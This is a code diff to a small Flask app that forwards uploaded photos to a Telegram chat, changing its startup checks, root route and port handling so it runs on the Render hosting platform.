@@ -6,7 +6,7 @@ import logging
 import requests
 from dotenv import load_dotenv
 
-# Load .env
+# Load .env (local only)
 load_dotenv()
 
 app = Flask(__name__)
@@ -22,10 +22,9 @@ logging.basicConfig(
 TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
 TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
 
-# Check if env loaded
+# ✅ FIX: Render compatible (no exit crash)
 if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
-    print("❌ ERROR: .env file missing or variables not set!")
-    exit()
+    raise Exception("❌ Environment variables missing (set in Render dashboard)")
 
 def send_to_telegram(photo_data):
     try:
@@ -56,7 +55,10 @@ def send_to_telegram(photo_data):
 
     except Exception as e:
         logging.error(f"❌ Exception: {str(e)}")
-        retu
+        return False
+
+
+@app.route('/')
 def index():
     return render_template('index.html')
 
@@ -74,5 +76,7 @@ def upload_file():
     return jsonify({'error': 'No photo received'}), 400
 
 
+# ✅ FIX: Render compatible PORT handling
 if __name__ == '__main__':
-    # ✅ 
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
